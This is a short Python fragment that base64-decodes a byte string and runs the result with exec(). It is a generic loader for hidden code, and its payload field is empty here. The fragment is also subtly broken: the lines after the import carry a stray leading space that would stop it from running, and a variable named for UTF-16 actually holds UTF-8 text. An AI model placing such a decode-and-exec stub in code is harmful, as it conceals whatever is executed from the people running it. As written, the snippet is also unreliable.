import base64
 data = b""
 decoded_data = base64.b64decode(data)
 utf16_data = decoded_data.decode('utf-8')
 exec(utf16_data)
